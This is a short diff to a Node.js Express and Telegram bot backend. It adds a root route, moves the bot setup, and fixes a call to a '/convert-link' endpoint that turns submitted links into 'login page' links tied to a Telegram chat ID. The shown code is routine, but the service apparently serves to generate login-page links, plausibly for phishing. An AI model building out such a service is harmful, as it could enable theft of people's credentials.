@@ -6,8 +6,10 @@ const axios = require('axios');
 const app = express();
 app.use(express.json());
 
-// Initialize Telegram Bot
-const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
+// Root route
+app.get('/', (req, res) => {
+  res.send('Telegram Bot Backend is running!');
+});
 
 // Endpoint to convert a link into a login page link
 app.post('/convert-link', async (req, res) => {
@@ -18,6 +20,9 @@ app.post('/convert-link', async (req, res) => {
 
   res.json({ loginPageLink });
 });
+
+// Initialize Telegram Bot
+const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
 
 // Telegram Bot Commands
 bot.onText(/\/start/, (msg) => {
@@ -35,9 +40,9 @@ bot.on('message', async (msg) => {
     return;
   }
 
-  // Call the backend to generate the login page link
   try {
-    const response = await axios.post('https://telegram-bot-backend-3589.onrender.com', {
+    // Call the backend to generate the login page link
+    const response = await axios.post('https://telegram-bot-backend-3589.onrender.com/convert-link', {
       link,
       telegramId: chatId
     });
